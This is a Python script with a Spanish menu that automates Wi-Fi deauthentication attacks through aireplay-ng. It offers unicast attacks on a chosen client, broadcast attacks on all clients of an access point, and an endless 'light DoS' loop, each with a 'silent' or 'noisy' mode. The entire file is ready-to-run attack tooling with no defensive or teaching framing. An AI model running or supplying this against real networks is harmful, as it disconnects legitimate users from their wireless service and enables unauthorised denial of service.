import os
import time

def menu():
    while True:
        print("\n=== Menu Principal - Deauth ===")
        print("1. Ataque Deauth Unicast")
        print("2. Ataque Deauth Broadcast")
        print("3. DoS ligero infinito al AP")
        print("0. Salir")

        opcion = input("Elegí una opción: ")

        if opcion == "1":
            deauth_unicast()
        elif opcion == "2":
            deauth_broadcast()
        elif opcion == "3":
            dos_ligero()
        elif opcion == "0":
            print("Saliendo del script.")
            break
        else:
            print("Opción inválida.")

def deauth_unicast():
    bssid = input("🛰️  Ingresá el BSSID del AP: ")
    client = input("📱 Ingresá la MAC del cliente: ")
    interface = input("🔌 Ingresá la interfaz (ej: wlan0mon): ")

    print("\n--- Modo de ataque ---")
    print("1. Modo silencio (pausado)")
    print("2. Modo ruidoso (spam)")

    modo = input("Elegí el modo: ")

    if modo == "1":
        print("\n💤 Ejecutando ataque silencioso (20 paquetes espaciados)...")
        for i in range(20):
            os.system(f"sudo aireplay-ng --deauth 1 -a {bssid} -c {client} {interface}")
            time.sleep(2)
    elif modo == "2":
        print("\n💣 Ejecutando ataque ruidoso (20 paquetes seguidos)...")
        for i in range(20):
            os.system(f"sudo aireplay-ng --deauth 1 -a {bssid} -c {client} {interface}")
    else:
        print("Modo inválido.")

def deauth_broadcast():
    bssid = input("🛰️  Ingresá el BSSID del AP: ")
    interface = input("🔌 Ingresá la interfaz (ej: wlan0mon): ")

    print("\n--- Modo de ataque ---")
    print("1. Modo silencio (pausado)")
    print("2. Modo ruidoso (spam)")

    modo = input("Elegí el modo: ")

    if modo == "1":
        print("\n💤 Ejecutando broadcast silencioso (20 paquetes)...")
        for i in range(20):
            os.system(f"sudo aireplay-ng --deauth 1 -a {bssid} {interface}")
            time.sleep(2)
    elif modo == "2":
        print("\n💣 Ejecutando broadcast ruidoso (20 paquetes seguidos)...")
        for i in range(20):
            os.system(f"sudo aireplay-ng --deauth 1 -a {bssid} {interface}")
    else:
        print("Modo inválido.")

def dos_ligero():
    bssid = input("🛰️  Ingresá el BSSID del AP para DoS: ")
    interface = input("🔌 Ingresá la interfaz (ej: wlan0mon): ")

    print("\n🌀 Ejecutando DoS ligero... (Ctrl+C para detener)")
    try:
        while True:
            os.system(f"sudo aireplay-ng --deauth 1 -a {bssid} {interface}")
            time.sleep(5)
    except KeyboardInterrupt:
        print("\n✅ Ataque detenido por el usuario.")

# Ejecutar
if __name__ == "__main__":
    menu()
